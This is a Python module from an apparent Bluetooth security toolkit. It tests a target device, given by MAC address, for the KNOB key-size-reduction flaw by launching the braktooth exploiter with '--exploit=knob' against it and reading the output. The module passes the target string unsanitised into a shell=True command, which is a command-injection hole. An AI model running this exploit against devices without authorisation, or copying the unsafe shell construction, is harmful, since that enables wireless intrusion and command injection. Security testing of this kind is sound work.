import argparse
import logging
import subprocess
import time
import re

from bluekit.report import report_not_vulnerable, report_vulnerable, report_error
from bluekit.recon import Recon
from bluekit.constants import LOG_FILE

logging.basicConfig(filename=LOG_FILE, level=logging.INFO)


def check_for_CVE_2018(target, directory='', attempt=0):
    proc = subprocess.Popen(
        '/usr/share/BlueToolkit/modules/tools/braktooth/wdissector/bin/bt_exploiter '
        '--host-port=/dev/ttyUSB1 --exploit=knob --random_bdaddress --target={}'.format(target),
        stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True,
        cwd='/usr/share/BlueToolkit/modules/tools/braktooth/wdissector'
    )

    try:
        output = b''
        deadline = time.time() + 90
        while time.time() < deadline:
            line = proc.stdout.readline()
            if not line and proc.poll() is not None:
                break
            output += line
            if b'KNOB Detected' in line:
                report_vulnerable("KNOB Detected - Device accepted reduced encryption key size")
                proc.kill()
                return
            if b'not_accepted' in line.lower() or b'Retry Timeout' in line:
                continue

        # Process finished or timed out without detection
        report_not_vulnerable("KNOB not detected")
    except Exception as e:
        logging.info("bluekit_knob -> error -> " + str(e))
        report_error("error - " + str(e))
    finally:
        if proc.poll() is None:
            proc.kill()
            proc.wait()



if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-t','--target',required=False, type=str, help="target MAC address")
    args = parser.parse_args()

    if args.target:
        check_for_CVE_2018(target=args.target)
    else:
        parser.print_help()
